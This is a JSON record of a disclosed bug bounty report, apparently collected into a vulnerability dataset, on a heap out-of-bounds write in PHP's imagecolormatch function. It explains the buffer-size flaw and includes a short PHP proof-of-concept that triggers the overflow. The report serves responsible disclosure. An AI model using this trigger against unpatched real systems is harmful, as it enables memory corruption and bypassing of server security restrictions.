{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "simonscannell ",
  "title": "imagecolormatch Out Of Bounds Write on Heap ",
  "content": "\nThe link to the PHP bug: https://bugs.php.net/bug.php?id=77270\nThis is possible to exploit in PHP 7.0.33 and 5.6.39. I used this vulnerability to write a local safe mode bypass exploit.\nIt is possible to write up to 1200 bytes over the boundaries of a buffer allocated in the imagecolormatch function, which then calls gdImageColorMatch()\nThe function takes two gdImagePtr as arguments and wants to compare both of them. It then allocates a dynamic buffer with the following calculation:\nbuf = (unsigned long *)safe_emalloc(sizeof(unsigned long), 5 * im2->colorsTotal, 0);\nim2->colorsTotal is under the control of an attacker. By simply allocating only one color to the second image, the calculation becomes sizeof(unsigned long) (8 byte on a 64 bit system) 5 1, which results in a buffer of 40 bytes.\nCode 484 Bytes\n1The buffer is then written to in a for loop.\n2\tfor (x=0; x<im1->sx; x++) {\n3\t\tfor( y=0; y<im1->sy; y++ ) {\n4\t\t\tcolor = im2->pixels[y][x];\n5\t\t\trgb = im1->tpixels[y][x];\n6\t\t\tbp = buf + (color * 5);\n7\t\t\t(*(bp++))++;\n8\t\t\t*(bp++) += gdTrueColorGetRed(rgb);\n9\t\t\t*(bp++) += gdTrueColorGetGreen(rgb);\n10\t\t\t*(bp++) += gdTrueColorGetBlue(rgb);\n11\t\t\t*(bp++) += gdTrueColorGetAlpha(rgb);\n12\t\t}\n13\n14The buffer is written to by means of a color being the index:\n15color = im2->pixels[y][x];\n16..\n17bp = buf + (color * 5);\nHowever, an attacker can set the value of color to be at maximum 255 (since it is a char). This would result in bp pointing at buffer + 1275 bytes. Since buffer is only 40 bytes big, this leads to an out of bounds write with data that is also under the control of the attacker.\nPoC PHP script:\nCode 178 Bytes\n1$img1 = imagecreatetruecolor(0xfff, 0xfff);\n2$img2 = imagecreate(0xfff, 0xfff);\n3imagecolorallocate($img2, 0, 0, 0);\n4imagesetpixel($img2, 0, 0, 255);\n5imagecolormatch($img1, $img2);\nImpact\nThis vulnerability allows attackers to bypass local security restrictions such as disabled functions.\n\n",
  "severity": [
    8.8,
    null
  ],
  "bounty": 1500,
  "weaknesses": [
    "Memory Corruption - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1602332040,
  "report_url": "https://hackerone.com/reports/478368",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create two images: one true color image (img1) and one palette-based image (img2)"
    ],
    [
      2,
      "Allocate a single color to img2 and set a pixel at (0,0) to use color index 255"
    ],
    [
      3,
      "Call imagecolormatch(img1, img2) to trigger the out-of-bounds write"
    ]
  ],
  "vuln_description": "The vulnerability is a heap-based out-of-bounds write in PHP's imagecolormatch() function. The function miscalculates the buffer size needed when comparing color palettes between two images. An attacker can control the color index used in the comparison, which leads to writing up to 1200 bytes outside the allocated buffer. This can be exploited to bypass local security restrictions.",
  "reason": "The vulnerability requires understanding of PHP's image handling internals and the specific miscalculation in buffer allocation. The attacker needs to manipulate image structures and understand how color indexes map to memory writes, but the core issue is relatively straightforward once the buffer calculation flaw is identified.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}